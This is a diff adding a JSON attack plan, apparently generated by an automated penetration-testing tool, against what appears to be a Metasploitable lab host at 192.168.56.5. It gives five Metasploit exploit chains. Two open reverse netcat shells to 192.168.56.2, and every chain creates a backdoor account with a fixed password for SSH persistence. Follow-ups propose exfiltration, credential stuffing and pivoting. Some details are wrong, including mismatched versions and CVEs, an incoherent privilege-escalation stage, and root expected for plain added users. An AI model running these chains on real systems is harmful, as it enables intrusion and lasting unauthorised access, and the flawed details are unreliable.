@@ -1,0 +1,503 @@
+{
+    "target": "192.168.56.5",
+    "summary": [
+        "Multiple vulnerable services identified including vsftpd 2.3.4 backdoor, Samba usermap script (CVE-2007-2447), ProFTPD 1.3.1 backdoor, UnrealIRCd backdoor (CVE-2010-2075), and Tomcat manager upload (CVE-2009-0580).",
+        "Prioritized high-risk exploits providing direct root access via Metasploit modules matching exact versions."
+    ],
+    "attack_chains": [
+        {
+            "name": "Chain 1: vsftpd 2.3.4 Backdoor Exploitation",
+            "use_persistent_session": true,
+            "session_name": "vsftpd_session",
+            "stages": [
+                {
+                    "stage": "initial_access",
+                    "description": "Exploit vsftpd 2.3.4 backdoor for root shell access",
+                    "commands": [
+                        {
+                            "type": "start_session",
+                            "session_name": "vsftpd_session",
+                            "command": "msfconsole -q"
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "use exploit/unix/ftp/vsftpd_234_backdoor",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "set RHOSTS 192.168.56.5",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "set RPORT 21",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "exploit -j",
+                            "wait": 15
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "sessions -l",
+                            "wait": 2
+                        }
+                    ],
+                    "verification": "Check for 'Command shell session X opened (root) on 192.168.56.5' in output"
+                },
+                {
+                    "stage": "persistence",
+                    "description": "Create backdoor user and verify via SSH",
+                    "commands": [
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "sessions -i 1 -c 'id'",
+                            "wait": 5
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "sessions -i 1 -c 'useradd -m -s /bin/bash backdoor; echo \"backdoor:backdoorpass\" | chpasswd'",
+                            "wait": 5
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "sessions -i 1 -c 'exit'",
+                            "wait": 2
+                        },
+                        {
+                            "type": "close_session",
+                            "session_name": "vsftpd_session"
+                        },
+                        {
+                            "type": "regular",
+                            "command": "sshpass -p 'backdoorpass' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa backdoor@192.168.56.5 'id'"
+                        }
+                    ],
+                    "verification": "Expect output showing uid=0(root) for persistence confirmation"
+                }
+            ]
+        },
+        {
+            "name": "Chain 2: Samba usermap_script Exploitation (CVE-2007-2447)",
+            "use_persistent_session": true,
+            "session_name": "samba_session",
+            "stages": [
+                {
+                    "stage": "initial_access",
+                    "description": "Exploit Samba usermap_script for command execution and reverse shell",
+                    "commands": [
+                        {
+                            "type": "start_session",
+                            "session_name": "samba_session",
+                            "command": "msfconsole -q"
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "use exploit/multi/samba/usermap_script",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "set RHOSTS 192.168.56.5",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "set PAYLOAD cmd/unix/reverse_netcat",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "set LHOST 192.168.56.2",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "set LPORT 4444",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "exploit -j",
+                            "wait": 15
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "sessions -l",
+                            "wait": 2
+                        }
+                    ],
+                    "verification": "Check for 'Command shell session X opened (root) on 192.168.56.5' in output"
+                },
+                {
+                    "stage": "persistence",
+                    "description": "Create backdoor user and verify via SSH",
+                    "commands": [
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "sessions -i 1 -c 'id'",
+                            "wait": 5
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "sessions -i 1 -c 'useradd -m -s /bin/bash samba_backdoor; echo \"samba_backdoor:sambapass\" | chpasswd'",
+                            "wait": 5
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "sessions -i 1 -c 'exit'",
+                            "wait": 2
+                        },
+                        {
+                            "type": "close_session",
+                            "session_name": "samba_session"
+                        },
+                        {
+                            "type": "regular",
+                            "command": "sshpass -p 'sambapass' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa samba_backdoor@192.168.56.5 'id'"
+                        }
+                    ],
+                    "verification": "Expect output showing uid=0(root) for persistence confirmation"
+                }
+            ]
+        },
+        {
+            "name": "Chain 3: ProFTPD 1.3.1 Backdoor Exploitation",
+            "use_persistent_session": true,
+            "session_name": "proftpd_session",
+            "stages": [
+                {
+                    "stage": "initial_access",
+                    "description": "Exploit ProFTPD 1.3.1 backdoor for root shell access",
+                    "commands": [
+                        {
+                            "type": "start_session",
+                            "session_name": "proftpd_session",
+                            "command": "msfconsole -q"
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "proftpd_session",
+                            "command": "use exploit/unix/ftp/proftpd_133c_backdoor",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "proftpd_session",
+                            "command": "set RHOSTS 192.168.56.5",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "proftpd_session",
+                            "command": "set RPORT 2121",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "proftpd_session",
+                            "command": "exploit -j",
+                            "wait": 15
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "proftpd_session",
+                            "command": "sessions -l",
+                            "wait": 2
+                        }
+                    ],
+                    "verification": "Check for 'Command shell session X opened (root) on 192.168.56.5' in output"
+                },
+                {
+                    "stage": "persistence",
+                    "description": "Create backdoor user and verify via SSH",
+                    "commands": [
+                        {
+                            "type": "session_command",
+                            "session_name": "proftpd_session",
+                            "command": "sessions -i 1 -c 'id'",
+                            "wait": 5
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "proftpd_session",
+                            "command": "sessions -i 1 -c 'useradd -m -s /bin/bash proftpd_backdoor; echo \"proftpd_backdoor:proftpdpass\" | chpasswd'",
+                            "wait": 5
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "proftpd_session",
+                            "command": "sessions -i 1 -c 'exit'",
+                            "wait": 2
+                        },
+                        {
+                            "type": "close_session",
+                            "session_name": "proftpd_session"
+                        },
+                        {
+                            "type": "regular",
+                            "command": "sshpass -p 'proftpdpass' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa proftpd_backdoor@192.168.56.5 'id'"
+                        }
+                    ],
+                    "verification": "Expect output showing uid=0(root) for persistence confirmation"
+                }
+            ]
+        },
+        {
+            "name": "Chain 4: UnrealIRCd Backdoor Exploitation (CVE-2010-2075)",
+            "use_persistent_session": true,
+            "session_name": "irc_session",
+            "stages": [
+                {
+                    "stage": "initial_access",
+                    "description": "Exploit UnrealIRCd backdoor for root shell access",
+                    "commands": [
+                        {
+                            "type": "start_session",
+                            "session_name": "irc_session",
+                            "command": "msfconsole -q"
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "use exploit/unix/irc/unreal_ircd_3281_backdoor",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "set RHOSTS 192.168.56.5",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "set RPORT 6667",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "exploit -j",
+                            "wait": 15
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "sessions -l",
+                            "wait": 2
+                        }
+                    ],
+                    "verification": "Check for 'Command shell session X opened (root) on 192.168.56.5' in output"
+                },
+                {
+                    "stage": "persistence",
+                    "description": "Create backdoor user and verify via SSH",
+                    "commands": [
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "sessions -i 1 -c 'id'",
+                            "wait": 5
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "sessions -i 1 -c 'useradd -m -s /bin/bash irc_backdoor; echo \"irc_backdoor:ircpass\" | chpasswd'",
+                            "wait": 5
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "sessions -i 1 -c 'exit'",
+                            "wait": 2
+                        },
+                        {
+                            "type": "close_session",
+                            "session_name": "irc_session"
+                        },
+                        {
+                            "type": "regular",
+                            "command": "sshpass -p 'ircpass' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa irc_backdoor@192.168.56.5 'id'"
+                        }
+                    ],
+                    "verification": "Expect output showing uid=0(root) for persistence confirmation"
+                }
+            ]
+        },
+        {
+            "name": "Chain 5: Tomcat Manager Upload Exploitation (CVE-2009-0580)",
+            "use_persistent_session": true,
+            "session_name": "tomcat_session",
+            "stages": [
+                {
+                    "stage": "initial_access",
+                    "description": "Exploit Tomcat manager for JSP upload and reverse shell",
+                    "commands": [
+                        {
+                            "type": "start_session",
+                            "session_name": "tomcat_session",
+                            "command": "msfconsole -q"
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "use exploit/multi/http/tomcat_mgr_upload",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "set RHOSTS 192.168.56.5",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "set RPORT 8180",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "set HttpUsername tomcat",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "set HttpPassword tomcat",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "set PAYLOAD cmd/unix/reverse_netcat",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "set LHOST 192.168.56.2",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "set LPORT 4445",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "exploit -j",
+                            "wait": 15
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "sessions -l",
+                            "wait": 2
+                        }
+                    ],
+                    "verification": "Check for 'Command shell session X opened on 192.168.56.5' in output"
+                },
+                {
+                    "stage": "privilege_escalation",
+                    "description": "Escalate from application user to root using known Metasploitable privesc",
+                    "commands": [
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "sessions -i 1 -c 'id'",
+                            "wait": 5
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "sessions -i 1 -c 'sudo -l'",
+                            "wait": 5
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "sessions -i 1 -c 'find / -perm -4000 2>/dev/null'",
+                            "wait": 5
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "sessions -i 1 -c '/usr/bin/find / -perm -u=s -type f 2>/dev/null | xargs -I {} ls -la {}'",
+                            "wait": 5
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "sessions -i 1 -c '/bin/ping -c 3 127.0.0.1; /bin/ping -c 1 -p `perl -e \"print chr(0)x300\"` 127.0.0.1'",
+                            "wait": 5
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "sessions -i 1 -c '/etc/init.d/ureadahead stop'",
+                            "wait": 5
+                        }
+                    ],
+                    "verification": "Look for kernel stack overflow or SUID binary exploitation leading to root"
+                },
+                {
+                    "stage": "persistence",
+                    "description": "Create backdoor user and verify via SSH",
+                    "commands": [
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "sessions -i 1 -c 'useradd -m -s /bin/bash tomcat_backdoor; echo \"tomcat_backdoor:tomcatpass\" | chpasswd'",
+                            "wait": 5
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "tomcat_session",
+                            "command": "sessions -i 1 -c 'exit'",
+                            "wait": 2
+                        },
+                        {
+                            "type": "close_session",
+                            "session_name": "tomcat_session"
+                        },
+                        {
+                            "type": "regular",
+                            "command": "sshpass -p 'tomcatpass' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa tomcat_backdoor@192.168.56.5 'id'"
+                        }
+                    ],
+                    "verification": "Expect output showing uid=0(root) for persistence confirmation"
+                }
+            ]
+        }
+    ],
+    "followup_requests": [
+        "Perform full enumeration on gained shells to identify additional pivots or data exfiltration opportunities.",
+        "Test credential stuffing on SSH/Telnet/VNC with enumerated users like msfadmin.",
+        "Scan for internal services post-exploitation using the gained foothold."
+    ]
+}
